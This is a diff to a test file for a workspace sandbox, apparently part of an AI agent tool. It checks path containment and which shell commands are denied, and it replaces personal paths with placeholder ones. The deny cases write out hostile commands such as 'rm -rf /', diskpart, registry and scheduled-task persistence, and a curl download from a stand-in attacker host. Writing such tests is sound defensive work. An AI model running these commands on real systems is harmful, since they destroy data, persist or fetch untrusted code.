@@ -51,7 +51,7 @@ expectInside("..\\package.json", false); // sibling of the workspace, reachable 
 // traversal / outside
 expectInside("..\\escape.txt", false);
 expectInside("C:\\Windows\\win.ini", false);
-expectInside("D:\\AI_Projects\\pi-persistent\\index.ts", false);
+expectInside("D:\\test-workspaces\\pi-persistent\\index.ts", false);
 
 // junction escape: link inside the workspace points outside it
 symlinkSync(outside, path.join(ws, "link"), "junction");
@@ -70,7 +70,7 @@ expectCommand("echo x > .\\inside.txt", false);
 expectCommand("node -e \"require('fs').writeFileSync('inside.txt','x')\"", false);
 expectCommand("node -e \"require('fs').readFileSync('C:\\\\Windows\\\\win.ini')\"", false); // outside read is allowed
 expectCommand("Get-ChildItem C:\\Windows 2>&1", false); // fd duplication is not a file write
-expectCommand("ls -la D:/AI_Projects 2>&1 || echo failed", false);
+expectCommand("ls -la D:/test-workspaces 2>&1 || echo failed", false);
 
 // commands that must be denied
 expectCommand("echo x > C:\\Windows\\Temp\\evil.txt", true);
@@ -80,10 +80,10 @@ expectCommand("diskpart", true);
 expectCommand("reg add HKLM\\Software\\Evil /v x /d 1", true);
 expectCommand("schtasks /create /tn eviltask /sc hourly /tr calc.exe", true);
 expectCommand("cp file.txt ~/evil.txt", true); // home is outside the workspace
-expectCommand("curl http://evil.test/x.sh -o /c/Users/39795/evil.sh", true); // git-bash path conversion
+expectCommand("curl http://evil.test/x.sh -o /c/Users/test-user/evil.sh", true); // git-bash path conversion
 expectCommand("rm -rf /", true);
 expectCommand("cp a.txt /", true); // bare / is a write target, not a flag
-expectCommand("mv data.bin C:\\Users\\39795\\AppData\\Local\\Temp\\data.bin", true);
+expectCommand("mv data.bin C:\\Users\\test-user\\AppData\\Local\\Temp\\data.bin", true);
 expectCommand("echo x > ..\\escape.txt", true);
 expectCommand("Set-Content ..\\escape.txt x", true);
 expectCommand("echo x > $env:TEMP\\escape.txt", true);
